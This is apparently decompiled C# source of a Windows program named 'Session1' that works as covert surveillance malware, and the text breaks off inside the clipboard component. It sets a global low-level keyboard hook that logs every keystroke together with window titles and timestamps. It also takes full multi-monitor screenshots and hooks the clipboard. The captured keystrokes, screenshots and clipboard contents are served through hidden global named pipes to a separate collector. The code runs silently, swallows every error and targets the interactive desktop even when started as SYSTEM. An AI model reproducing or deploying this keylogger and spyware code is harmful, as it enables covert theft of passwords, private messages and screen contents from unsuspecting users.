using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.IO.Pipes;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Session1.ClipBoard;
using Session1.Remote_Keyboard;
using Session1.desktop;

[assembly: CompilationRelaxations(8)]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
[assembly: AssemblyTitle("Session1")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("Session1")]
[assembly: AssemblyCopyright("Copyright ©  2024")]
[assembly: AssemblyTrademark("")]
[assembly: ComVisible(false)]
[assembly: Guid("a44fd107-0e35-4527-8620-877843f1ae83")]
[assembly: AssemblyFileVersion("1.0.0.0")]
[assembly: AssemblyVersion("1.0.0.0")]
namespace algorithm
{
	public class GZip
	{
		public static byte[] Compress(byte[] buff)
		{
			using MemoryStream memoryStream = new MemoryStream();
			byte[] bytes = BitConverter.GetBytes(buff.Length);
			memoryStream.Write(bytes, 0, 4);
			using (GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Compress))
			{
				gZipStream.Write(buff, 0, buff.Length);
				gZipStream.Flush();
			}
			return memoryStream.ToArray();
		}

		public static byte[] Decompress(byte[] buff)
		{
			using MemoryStream memoryStream = new MemoryStream(buff);
			byte[] array = new byte[4];
			memoryStream.Read(array, 0, 4);
			int num = BitConverter.ToInt32(array, 0);
			using GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
			byte[] array2 = new byte[num];
			gZipStream.Read(array2, 0, num);
			return array2;
		}
	}
}
namespace Session1
{
	public static class KeyBoardDisplayList
	{
		private static Hashtable HtKeyBoardButton = new Hashtable();

		public static void clearHashtable()
		{
			HtKeyBoardButton.Clear();
		}

		public static void Init()
		{
			if (HtKeyBoardButton.Count == 0)
			{
				HtKeyBoardButton.Add(0, "[None]");
				HtKeyBoardButton.Add(8, "[Backspace]");
				HtKeyBoardButton.Add(9, "[Tab]");
				HtKeyBoardButton.Add(12, "[Clear]");
				HtKeyBoardButton.Add(13, "[Enter]");
				HtKeyBoardButton.Add(16, "[Shift]");
				HtKeyBoardButton.Add(17, "[Ctrl]");
				HtKeyBoardButton.Add(18, "[Alt]");
				HtKeyBoardButton.Add(19, "[Pause]");
				HtKeyBoardButton.Add(20, "[CapsLock]");
				HtKeyBoardButton.Add(27, "[Esc]");
				HtKeyBoardButton.Add(32, " ");
				HtKeyBoardButton.Add(33, "[PageUp]");
				HtKeyBoardButton.Add(34, "[PageDown]");
				HtKeyBoardButton.Add(35, "[End]");
				HtKeyBoardButton.Add(36, "[Home]");
				HtKeyBoardButton.Add(37, "[←]");
				HtKeyBoardButton.Add(38, "[↑]");
				HtKeyBoardButton.Add(39, "[→]");
				HtKeyBoardButton.Add(40, "[↓]");
				HtKeyBoardButton.Add(41, "[Select]");
				HtKeyBoardButton.Add(42, "[PrintScreen]");
				HtKeyBoardButton.Add(43, "[Execute]");
				HtKeyBoardButton.Add(44, "[SnapShot]");
				HtKeyBoardButton.Add(45, "[Insert]");
				HtKeyBoardButton.Add(46, "[Delete]");
				HtKeyBoardButton.Add(47, "[Help]");
				HtKeyBoardButton.Add(48, "0");
				HtKeyBoardButton.Add(49, "1");
				HtKeyBoardButton.Add(50, "2");
				HtKeyBoardButton.Add(51, "3");
				HtKeyBoardButton.Add(52, "4");
				HtKeyBoardButton.Add(53, "5");
				HtKeyBoardButton.Add(54, "6");
				HtKeyBoardButton.Add(55, "7");
				HtKeyBoardButton.Add(56, "8");
				HtKeyBoardButton.Add(57, "9");
				HtKeyBoardButton.Add(65, "A");
				HtKeyBoardButton.Add(66, "B");
				HtKeyBoardButton.Add(67, "C");
				HtKeyBoardButton.Add(68, "D");
				HtKeyBoardButton.Add(69, "E");
				HtKeyBoardButton.Add(70, "F");
				HtKeyBoardButton.Add(71, "G");
				HtKeyBoardButton.Add(72, "H");
				HtKeyBoardButton.Add(73, "I");
				HtKeyBoardButton.Add(74, "J");
				HtKeyBoardButton.Add(75, "K");
				HtKeyBoardButton.Add(76, "L");
				HtKeyBoardButton.Add(77, "M");
				HtKeyBoardButton.Add(78, "N");
				HtKeyBoardButton.Add(79, "O");
				HtKeyBoardButton.Add(80, "P");
				HtKeyBoardButton.Add(81, "Q");
				HtKeyBoardButton.Add(82, "R");
				HtKeyBoardButton.Add(83, "S");
				HtKeyBoardButton.Add(84, "T");
				HtKeyBoardButton.Add(85, "U");
				HtKeyBoardButton.Add(86, "V");
				HtKeyBoardButton.Add(87, "W");
				HtKeyBoardButton.Add(88, "X");
				HtKeyBoardButton.Add(89, "Y");
				HtKeyBoardButton.Add(90, "Z");
				HtKeyBoardButton.Add(91, "[LWin]");
				HtKeyBoardButton.Add(92, "[RWin]");
				HtKeyBoardButton.Add(93, "[Apps]");
				HtKeyBoardButton.Add(96, "0");
				HtKeyBoardButton.Add(97, "1");
				HtKeyBoardButton.Add(98, "2");
				HtKeyBoardButton.Add(99, "3");
				HtKeyBoardButton.Add(100, "4");
				HtKeyBoardButton.Add(101, "5");
				HtKeyBoardButton.Add(102, "6");
				HtKeyBoardButton.Add(103, "7");
				HtKeyBoardButton.Add(104, "8");
				HtKeyBoardButton.Add(105, "9");
				HtKeyBoardButton.Add(106, "*");
				HtKeyBoardButton.Add(107, "+");
				HtKeyBoardButton.Add(108, "[Enter]");
				HtKeyBoardButton.Add(109, "-");
				HtKeyBoardButton.Add(110, ".");
				HtKeyBoardButton.Add(111, "/");
				HtKeyBoardButton.Add(112, "F1");
				HtKeyBoardButton.Add(113, "F2");
				HtKeyBoardButton.Add(114, "F3");
				HtKeyBoardButton.Add(115, "F4");
				HtKeyBoardButton.Add(116, "F5");
				HtKeyBoardButton.Add(117, "F6");
				HtKeyBoardButton.Add(118, "F7");
				HtKeyBoardButton.Add(119, "F8");
				HtKeyBoardButton.Add(120, "F9");
				HtKeyBoardButton.Add(121, "F10");
				HtKeyBoardButton.Add(122, "F11");
				HtKeyBoardButton.Add(123, "F12");
				HtKeyBoardButton.Add(124, "F13");
				HtKeyBoardButton.Add(125, "F14");
				HtKeyBoardButton.Add(126, "F15");
				HtKeyBoardButton.Add(127, "F16");
				HtKeyBoardButton.Add(144, "[NumLock]");
				HtKeyBoardButton.Add(145, "[ScreenPrint]");
				HtKeyBoardButton.Add(160, "[Shift]");
				HtKeyBoardButton.Add(161, "[Shift]");
				HtKeyBoardButton.Add(162, "[Ctrl]");
				HtKeyBoardButton.Add(163, "[Ctrl]");
				HtKeyBoardButton.Add(164, "[Alt]");
				HtKeyBoardButton.Add(165, "[Alt]");
				HtKeyBoardButton.Add(186, ";");
				HtKeyBoardButton.Add(187, "+");
				HtKeyBoardButton.Add(188, ",");
				HtKeyBoardButton.Add(189, "-");
				HtKeyBoardButton.Add(190, ".");
				HtKeyBoardButton.Add(191, "/");
				HtKeyBoardButton.Add(192, "~");
				HtKeyBoardButton.Add(219, "[");
				HtKeyBoardButton.Add(220, "\\");
				HtKeyBoardButton.Add(221, "]");
				HtKeyBoardButton.Add(222, "'");
			}
		}

		public static string GetStrByCode(int code)
		{
			if (HtKeyBoardButton.Contains(code))
			{
				return ((string)HtKeyBoardButton[code]) ?? null;
			}
			return null;
		}
	}
	public class keyboardManagaers
	{
		private object syncroot = new object();

		private const int WH_KEYBOARD_LL = 13;

		private const int WM_KEYDOWN = 256;

		private NtApi32.HookProc _KeyboardProc;

		private IntPtr _HHOOK = IntPtr.Zero;

		private static List<byte> KeyboardList = new List<byte>();

		private string CurrentActiveWindowTitle;

		public void Run()
		{
			if (Process.GetCurrentProcess().SessionId == 0)
			{
				return;
			}
			if (MutexUtils.CreateMutex("board"))
			{
				Thread thread = new Thread((ParameterizedThreadStart)delegate
				{
					WindowStation.SetWindowStation();
					KeyBoardDisplayList.Init();
					_KeyboardProc = KeyboardProc;
					KeyboardSetHook();
					Application.Run();
				});
				thread.SetApartmentState(ApartmentState.MTA);
				thread.Start();
			}
			while (true)
			{
				try
				{
					using NamedPipeServerStream namedPipeServerStream = new NamedPipeServerStream("\\\\.\\pipe\\Global\\keyboardddd", PipeDirection.InOut);
					namedPipeServerStream.WaitForConnection();
					while (true)
					{
						byte[] array = null;
						lock (syncroot)
						{
							if (KeyboardList.Count > 0)
							{
								array = KeyboardList.ToArray();
								KeyboardList.Clear();
							}
						}
						if (array != null && array.Length != 0)
						{
							namedPipeServerStream.Write(array, 0, array.Length);
						}
						Thread.Sleep(TimeSpan.FromSeconds(5.0));
					}
				}
				catch
				{
				}
			}
		}

		private void KeyboardSetHook()
		{
			try
			{
				using Process process = Process.GetCurrentProcess();
				using ProcessModule processModule = process.MainModule;
				_HHOOK = NtApi32.SetWindowsHookEx(13, _KeyboardProc, NtApi32.GetModuleHandle(processModule.ModuleName), 0u);
				if (_HHOOK == IntPtr.Zero)
				{
					throw new Exception();
				}
			}
			catch (Exception)
			{
				KeyboardList = null;
				_KeyboardProc = null;
				KeyBoardDisplayList.clearHashtable();
			}
		}

		private IntPtr KeyboardProc(int nCode, IntPtr wParam, IntPtr lParam)
		{
			try
			{
				if (nCode >= 0 && wParam == (IntPtr)256)
				{
					StringBuilder stringBuilder = new StringBuilder();
					int num = Marshal.ReadInt32(lParam);
					string text = KeyBoardDisplayList.GetStrByCode(num) ?? ("[" + Enum.GetName(typeof(Keys), num) + "]");
					string activeWindowTitle = GetActiveWindowTitle();
					if (activeWindowTitle.Equals(CurrentActiveWindowTitle))
					{
						stringBuilder.Append(text);
					}
					else
					{
						stringBuilder.AppendLine();
						stringBuilder.AppendLine();
						stringBuilder.AppendLine("[ title ]: " + activeWindowTitle);
						stringBuilder.AppendLine("[ time ]: " + DateTime.Now);
						stringBuilder.Append("[ content ]: " + text);
						CurrentActiveWindowTitle = activeWindowTitle;
					}
					lock (syncroot)
					{
						KeyboardList.AddRange(Encoding.UTF8.GetBytes(stringBuilder.ToString().ToLower()));
					}
				}
				return NtApi32.CallNextHookEx(_HHOOK, nCode, wParam, lParam);
			}
			catch (Exception)
			{
				return IntPtr.Zero;
			}
		}

		private string GetActiveWindowTitle()
		{
			try
			{
				NtApi32.GetWindowThreadProcessId(NtApi32.GetForegroundWindow(), out var lpdwProcessId);
				return Process.GetProcessById((int)lpdwProcessId).MainWindowTitle ?? "?????";
			}
			catch
			{
				return "?????";
			}
		}

		public void KeyboardStopSetHook()
		{
			try
			{
				NtApi32.UnhookWindowsHookEx(_HHOOK);
				KeyboardList?.Clear();
				Application.Exit();
			}
			catch (Exception)
			{
			}
			finally
			{
				KeyBoardDisplayList.clearHashtable();
				KeyboardList = null;
				_KeyboardProc = null;
				GC.Collect();
			}
		}
	}
	public class MutexUtils
	{
		private static Mutex _mutex;

		public static bool CreateMutex(string MutexName)
		{
			new Mutex(initiallyOwned: true, "Global\\" + MutexName, out var createdNew);
			return createdNew;
		}

		public static bool openExitMutex(string MutexName)
		{
			try
			{
				return Mutex.OpenExisting("Global\\" + MutexName) != null;
			}
			catch
			{
			}
			return false;
		}

		public static void CreateMutex(string MutexName, bool isMutex)
		{
			if (isMutex)
			{
				_mutex = new Mutex(initiallyOwned: true, "Global\\" + MutexName, out var createdNew);
				if (!createdNew)
				{
					Process.GetCurrentProcess().Kill();
				}
			}
		}

		public static void ReleaseMutex()
		{
			_mutex?.ReleaseMutex();
		}
	}
	public static class NtApi32
	{
		public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

		public const uint CF_TEXT = 1u;

		public const uint CF_DSPBITMAP = 2u;

		public const uint CF_HDROP = 15u;

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr GetClipboardData(uint uFormat);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool IsClipboardFormatAvailable(uint format);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool OpenClipboard(IntPtr hWndNewOwner);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool CloseClipboard();

		[DllImport("kernel32.dll")]
		public static extern IntPtr GlobalLock(IntPtr hMem);

		[DllImport("kernel32.dll")]
		public static extern bool GlobalUnlock(IntPtr hMem);

		[DllImport("kernel32.dll")]
		public static extern int GlobalSize(IntPtr hMem);

		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		public static extern IntPtr GetClipboardFormatName(uint format, StringBuilder lpszFormatName, int cchMaxCount);

		[DllImport("shell32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern uint DragQueryFile(IntPtr hDrop, uint iFile, [Out] char[] lpszFile, uint cch);

		[DllImport("user32.dll")]
		public static extern IntPtr FindWindowA([In][MarshalAs(UnmanagedType.LPStr)] string lpClassName, [In][MarshalAs(UnmanagedType.LPStr)] string lpWindowName);

		[DllImport("User32.dll")]
		public static extern int SetClipboardViewer(int hWndNewViewer);

		[DllImport("User32.dll", CharSet = CharSet.Auto)]
		public static extern bool ChangeClipboardChain(IntPtr hWndRemove, IntPtr hWndNewNext);

		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		public static extern int SendMessage(IntPtr hwnd, int wMsg, IntPtr wParam, IntPtr lParam);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr OpenInputDesktop(uint dwFlags, bool fInherit, uint dwDesiredAccess);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool GetUserObjectInformation(IntPtr hObj, int nIndex, byte[] pvInfo, uint nLength, ref uint lpnLengthNeeded);

		[DllImport("user32.dll")]
		public static extern IntPtr OpenWindowStation(string lpszWinSta, bool fInherit, uint dwDesiredAccess);

		[DllImport("user32.dll")]
		public static extern bool SetProcessWindowStation(IntPtr hWinSta);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr OpenDesktop(string lpszDesktop, uint dwFlags, bool fInherit, uint dwDesiredAccess);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool CloseDesktop(IntPtr hDesktop);

		[DllImport("user32.dll")]
		public static extern bool SetThreadDesktop(IntPtr hDesktop);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool UnhookWindowsHookEx(IntPtr hhk);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr GetModuleHandle(string lpModuleName);

		[DllImport("user32.dll")]
		public static extern IntPtr GetForegroundWindow();

		[DllImport("user32.dll", SetLastError = true)]
		public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
	}
	internal static class Program
	{
		[STAThread]
		private static void Main()
		{
			desktopManager.Run();
			ClipBoardManagers.Run();
			new keyboardManagaers().Run();
		}
	}
	public class WindowStation
	{
		private const uint MAXIMUM_ALLOWED = 33554432u;

		private const uint GENERIC_ALL = 268435456u;

		private const uint DF_ALLOWOTHERACCOUNTHOOK = 1u;

		private const int UOI_NAME = 2;

		private const uint WINSTA_ACCESSCLIPBOARD = 4u;

		private const uint WINSTA_ACCESSGLOBALATOMS = 32u;

		private const uint WINSTA_CREATEDESKTOP = 8u;

		private const uint WINSTA_ENUMDESKTOPS = 1u;

		private const uint WINSTA_ENUMERATE = 256u;

		private const uint WINSTA_EXITWINDOWS = 64u;

		private const uint WINSTA_READATTRIBUTES = 2u;

		private const uint WINSTA_READSCREEN = 512u;

		private const uint WINSTA_WRITEATTRIBUTES = 16u;

		private const int DESKTOP_READOBJECTS = 1;

		private const int DESKTOP_CREATEWINDOW = 2;

		private const int DESKTOP_CREATEMENU = 4;

		private const int DESKTOP_HOOKCONTROL = 8;

		private const int DESKTOP_JOURNALRECORD = 16;

		private const int DESKTOP_JOURNALPLAYBACK = 32;

		private const int DESKTOP_ENUMERATE = 64;

		private const int DESKTOP_WRITEOBJECTS = 128;

		private const int DESKTOP_SWITCHDESKTOP = 256;

		public static void SetWindowStation()
		{
			try
			{
				if (!Environment.UserName.ToLower().Equals("system"))
				{
					return;
				}
				IntPtr intPtr = NtApi32.OpenWindowStation("WinSta0", fInherit: false, 895u);
				if (intPtr == IntPtr.Zero || !NtApi32.SetProcessWindowStation(intPtr))
				{
					return;
				}
				IntPtr intPtr2 = NtApi32.OpenInputDesktop(1u, fInherit: false, 33554432u);
				if (!(intPtr2 == IntPtr.Zero))
				{
					byte[] array = new byte[256];
					uint lpnLengthNeeded = 0u;
					NtApi32.GetUserObjectInformation(intPtr2, 2, array, (uint)array.Length, ref lpnLengthNeeded);
					if (lpnLengthNeeded != 0)
					{
						NtApi32.SetThreadDesktop(intPtr2);
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}
}
namespace Session1.Properties
{
	[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "17.0.0.0")]
	[DebuggerNonUserCode]
	[CompilerGenerated]
	internal class Resources
	{
		private static ResourceManager resourceMan;

		private static CultureInfo resourceCulture;

		[EditorBrowsable(EditorBrowsableState.Advanced)]
		internal static ResourceManager ResourceManager
		{
			get
			{
				if (resourceMan == null)
				{
					resourceMan = new ResourceManager("Session1.Properties.Resources", typeof(Resources).Assembly);
				}
				return resourceMan;
			}
		}

		[EditorBrowsable(EditorBrowsableState.Advanced)]
		internal static CultureInfo Culture
		{
			get
			{
				return resourceCulture;
			}
			set
			{
				resourceCulture = value;
			}
		}

		internal Resources()
		{
		}
	}
	[CompilerGenerated]
	[GeneratedCode("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "17.11.0.0")]
	internal sealed class Settings : ApplicationSettingsBase
	{
		private static Settings defaultInstance = (Settings)(object)SettingsBase.Synchronized((SettingsBase)(object)new Settings());

		public static Settings Default => defaultInstance;
	}
}
namespace Session1.Remote_Keyboard
{
	public enum Keys
	{
		Modifiers = -65536,
		None = 0,
		LButton = 1,
		RButton = 2,
		Cancel = 3,
		MButton = 4,
		XButton1 = 5,
		XButton2 = 6,
		Back = 8,
		Tab = 9,
		LineFeed = 10,
		Clear = 12,
		Return = 13,
		Enter = 13,
		ShiftKey = 16,
		ControlKey = 17,
		Menu = 18,
		Pause = 19,
		Capital = 20,
		CapsLock = 20,
		KanaMode = 21,
		HanguelMode = 21,
		HangulMode = 21,
		JunjaMode = 23,
		FinalMode = 24,
		HanjaMode = 25,
		KanjiMode = 25,
		Escape = 27,
		IMEConvert = 28,
		IMENonconvert = 29,
		IMEAccept = 30,
		IMEAceept = 30,
		IMEModeChange = 31,
		Space = 32,
		Prior = 33,
		PageUp = 33,
		Next = 34,
		PageDown = 34,
		End = 35,
		Home = 36,
		Left = 37,
		Up = 38,
		Right = 39,
		Down = 40,
		Select = 41,
		Print = 42,
		Execute = 43,
		Snapshot = 44,
		PrintScreen = 44,
		Insert = 45,
		Delete = 46,
		Help = 47,
		D0 = 48,
		D1 = 49,
		D2 = 50,
		D3 = 51,
		D4 = 52,
		D5 = 53,
		D6 = 54,
		D7 = 55,
		D8 = 56,
		D9 = 57,
		A = 65,
		B = 66,
		C = 67,
		D = 68,
		E = 69,
		F = 70,
		G = 71,
		H = 72,
		I = 73,
		J = 74,
		K = 75,
		L = 76,
		M = 77,
		N = 78,
		O = 79,
		P = 80,
		Q = 81,
		R = 82,
		S = 83,
		T = 84,
		U = 85,
		V = 86,
		W = 87,
		X = 88,
		Y = 89,
		Z = 90,
		LWin = 91,
		RWin = 92,
		Apps = 93,
		Sleep = 95,
		NumPad0 = 96,
		NumPad1 = 97,
		NumPad2 = 98,
		NumPad3 = 99,
		NumPad4 = 100,
		NumPad5 = 101,
		NumPad6 = 102,
		NumPad7 = 103,
		NumPad8 = 104,
		NumPad9 = 105,
		Multiply = 106,
		Add = 107,
		Separator = 108,
		Subtract = 109,
		Decimal = 110,
		Divide = 111,
		F1 = 112,
		F2 = 113,
		F3 = 114,
		F4 = 115,
		F5 = 116,
		F6 = 117,
		F7 = 118,
		F8 = 119,
		F9 = 120,
		F10 = 121,
		F11 = 122,
		F12 = 123,
		F13 = 124,
		F14 = 125,
		F15 = 126,
		F16 = 127,
		F17 = 128,
		F18 = 129,
		F19 = 130,
		F20 = 131,
		F21 = 132,
		F22 = 133,
		F23 = 134,
		F24 = 135,
		NumLock = 144,
		Scroll = 145,
		LShiftKey = 160,
		RShiftKey = 161,
		LControlKey = 162,
		RControlKey = 163,
		LMenu = 164,
		RMenu = 165,
		BrowserBack = 166,
		BrowserForward = 167,
		BrowserRefresh = 168,
		BrowserStop = 169,
		BrowserSearch = 170,
		BrowserFavorites = 171,
		BrowserHome = 172,
		VolumeMute = 173,
		VolumeDown = 174,
		VolumeUp = 175,
		MediaNextTrack = 176,
		MediaPreviousTrack = 177,
		MediaStop = 178,
		MediaPlayPause = 179,
		LaunchMail = 180,
		SelectMedia = 181,
		LaunchApplication1 = 182,
		LaunchApplication2 = 183,
		OemSemicolon = 186,
		Oem1 = 186,
		Oemplus = 187,
		Oemcomma = 188,
		OemMinus = 189,
		OemPeriod = 190,
		OemQuestion = 191,
		Oem2 = 191,
		Oemtilde = 192,
		Oem3 = 192,
		OemOpenBrackets = 219,
		Oem4 = 219,
		OemPipe = 220,
		Oem5 = 220,
		OemCloseBrackets = 221,
		Oem6 = 221,
		OemQuotes = 222,
		Oem7 = 222,
		Oem8 = 223,
		OemBackslash = 226,
		Oem102 = 226,
		ProcessKey = 229,
		Packet = 231,
		Attn = 246,
		Crsel = 247,
		Exsel = 248,
		EraseEof = 249,
		Play = 250,
		Zoom = 251,
		NoName = 252,
		Pa1 = 253,
		OemClear = 254,
		KeyCode = 65535,
		Shift = 65536,
		Control = 131072,
		Alt = 262144
	}
}
namespace Session1.desktop
{
	public class desktopManager
	{
		public static void Run()
		{
			if (Process.GetCurrentProcess().SessionId == 0)
			{
				return;
			}
			ThreadPool.QueueUserWorkItem(delegate
			{
				WindowStation.SetWindowStation();
				while (true)
				{
					try
					{
						using NamedPipeServerStream namedPipeServerStream = new NamedPipeServerStream("\\\\.\\pipe\\Global\\desktopccc", PipeDirection.InOut);
						namedPipeServerStream.WaitForConnection();
						simpledesktop simpledesktop2 = new simpledesktop();
						while (true)
						{
							byte[] array = new byte[2];
							int num = namedPipeServerStream.Read(array, 0, array.Length);
							if (num == 0 || num != 2)
							{
								break;
							}
							byte[] array2 = simpledesktop2.CaptureScreenshots();
							List<byte> list = new List<byte>();
							list.AddRange(BitConverter.GetBytes(array2.Length));
							list.AddRange(array2);
							if (list.Count > 0)
							{
								namedPipeServerStream.Write(list.ToArray(), 0, list.Count);
							}
						}
					}
					catch
					{
					}
				}
			});
		}
	}
	public class simpledesktop
	{
		private struct CURSORINFO
		{
			public int cbSize;

			public int flags;

			public IntPtr hCursor;

			public POINTAPI ptScreenPos;
		}

		private struct POINTAPI
		{
			public int x;

			public int y;
		}

		private ImageCodecInfo m_ImageCodecInfo;

		private long m_ImageQuality = 40L;

		private Rectangle bounds;

		private Size ScreenDESKTOP;

		private const int CURSOR_SHOWING = 1;

		private const int DI_NORMAL = 3;

		private const int DESKTOPVERTRES = 117;

		private const int DESKTOPHORZRES = 118;

		public static Size DESKTOP
		{
			get
			{
				IntPtr dC = GetDC(IntPtr.Zero);
				Size result = default(Size);
				result.Width = GetDeviceCaps(dC, 118);
				result.Height = GetDeviceCaps(dC, 117);
				ReleaseDC(IntPtr.Zero, dC);
				return result;
			}
		}

		public simpledesktop()
		{
			bounds = Screen.get_AllScreens()[0].get_Bounds();
			ScreenDESKTOP = DESKTOP;
			GetCodecInfo("image/jpeg");
		}

		private void GetCodecInfo(string mimeType)
		{
			try
			{
				ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
				foreach (ImageCodecInfo val in imageEncoders)
				{
					if (val.get_MimeType() == mimeType)
					{
						m_ImageCodecInfo = val;
					}
				}
			}
			catch (Exception)
			{
			}
		}

		private byte[] ImageToBytes(Image image)
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			//IL_0019: Unknown result type (might be due to invalid IL or missing references)
			//IL_001f: Expected O, but got Unknown
			if (image == null)
			{
				return null;
			}
			byte[] array = null;
			try
			{
				EncoderParameters val = new EncoderParameters(1);
				try
				{
					EncoderParameter val2 = new EncoderParameter(Encoder.Quality, m_ImageQuality);
					try
					{
						val.get_Param()[0] = val2;
						using MemoryStream memoryStream = new MemoryStream();
						image.Save((Stream)memoryStream, m_ImageCodecInfo, val);
						memoryStream.Seek(0L, SeekOrigin.Begin);
						array = new byte[memoryStream.Length];
						memoryStream.Read(array, 0, array.Length);
						memoryStream.Close();
						image.Dispose();
						return array;
					}
					finally
					{
						((IDisposable)val2)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val)?.Dispose();
				}
			}
			catch (Exception)
			{
				return array;
			}
		}

		private Image CaptureScreenshotsImage()
		{
			//IL_0075: Unknown result type (might be due to invalid IL or missing references)
			//IL_007b: Expected O, but got Unknown
			try
			{
				Screen[] allScreens = Screen.get_AllScreens();
				int num = 0;
				int val = 0;
				for (int i = 0; i < allScreens.Length; i++)
				{
					num += allScreens[i].get_Bounds().Width;
					val = Math.Max(val, allScreens[i].get_Bounds().Height);
				}
				num = Math.Max(num, ScreenDESKTOP.Width);
				val = Math.Max(val, ScreenDESKTOP.Height);
				Bitmap val2 = new Bitmap(num, val, (PixelFormat)2498570);
				Graphics val3 = Graphics.FromImage((Image)(object)val2);
				try
				{
					int num2 = 0;
					int num3 = 0;
					if (allScreens.Length == 1)
					{
						val3.CopyFromScreen(0, 0, 0, 0, ScreenDESKTOP);
					}
					else
					{
						for (int j = 0; j < allScreens.Length; j++)
						{
							Screen val4 = Screen.get_AllScreens()[j];
							val3.CopyFromScreen(val4.get_Bounds().X, val4.get_Bounds().Y, num2, num3, val4.get_Bounds().Size);
							num2 += val4.get_Bounds().Width;
						}
					}
					CURSORINFO pci = default(CURSORINFO);
					pci.cbSize = Marshal.SizeOf(typeof(CURSORINFO));
					if (GetCursorInfo(out pci) && pci.flags == 1)
					{
						DrawIconEx(val3.GetHdc(), pci.ptScreenPos.x - bounds.X, pci.ptScreenPos.y - bounds.Y, pci.hCursor, 0, 0, 0, IntPtr.Zero, 3);
						val3.ReleaseHdc();
					}
				}
				finally
				{
					((IDisposable)val3)?.Dispose();
				}
				return (Image)(object)val2;
			}
			catch (Exception)
			{
			}
			return null;
		}

		private Image GetScreen()
		{
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_001c: Expected O, but got Unknown
			Bitmap val = new Bitmap(ScreenDESKTOP.Width, ScreenDESKTOP.Height);
			try
			{
				Graphics val2 = Graphics.FromImage((Image)(object)val);
				try
				{
					val2.CopyFromScreen(new Point(0, 0), new Point(0, 0), ScreenDESKTOP);
					CURSORINFO pci = default(CURSORINFO);
					pci.cbSize = Marshal.SizeOf(typeof(CURSORINFO));
					if (GetCursorInfo(out pci))
					{
						if (pci.flags == 1)
						{
							DrawIconEx(val2.GetHdc(), pci.ptScreenPos.x - bounds.X, pci.ptScreenPos.y - bounds.Y, pci.hCursor, 0, 0, 0, IntPtr.Zero, 3);
							val2.ReleaseHdc();
							return (Image)(object)val;
						}
						return (Image)(object)val;
					}
					return (Image)(object)val;
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			catch (Exception)
			{
				return (Image)(object)val;
			}
		}

		public byte[] CaptureScreenshots()
		{
			return ImageToBytes(CaptureScreenshotsImage());
		}

		[DllImport("user32.dll")]
		private static extern bool GetCursorInfo(out CURSORINFO pci);

		[DllImport("user32.dll", SetLastError = true)]
		private static extern bool DrawIconEx(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon, int cxWidth, int cyHeight, int istepIfAniCur, IntPtr hbrFlickerFreeDraw, int diFlags);

		[DllImport("user32.dll")]
		private static extern IntPtr GetDC(IntPtr ptr);

		[DllImport("gdi32.dll")]
		private static extern int GetDeviceCaps(IntPtr hdc, int nIndex);

		[DllImport("user32.dll")]
		private static extern IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDc);
	}
}
namespace Session1.ClipBoard
{
	public class ClipBoardForm1 : Form
	{
		public List<ClipInfo> ClipInfos = new List<ClipInfo>();

		public object syncroot = new object();

		private IntPtr nextClipboardViewer;

		private IContainer components;

		public ClipBoardForm1()
		{
			InitializeComponent();
		}

		private void ClipBoardForm1_Load(object sender, EventArgs e)
		{
			nextClipboardViewer = (IntPtr)NtApi32.SetClipboardViewer((int)((Control)this).get_Handle());
			ThreadPool.QueueUserWorkItem(delegate
			{
				while (true)
				{
					try
					{
						using NamedPipeServerStream namedPipeServerStream = new NamedPipeServerStream("\\\\.\\pipe\\Global\\ClipBoardaaaa", PipeDirection.InOut);
						namedPipeServerStream.WaitForConnection();
						List<byte> list = new List<byte>();
						lock (syncroot)
						{
							foreach (ClipInfo clipInfo in ClipInfos)
							{
								list.AddRange(Encoding.UTF8.GetBytes(clipInfo.time + "\r\n"));
								list.AddRange(Encoding.UTF8.GetBytes(clipInfo.type + "\r\n"));
								list.AddRange(Encoding.UTF8.GetBytes(clipInfo.content + "\r\n"));
							}
							ClipInfos.Clear();
						}
						if (list.Count > 0)
						{
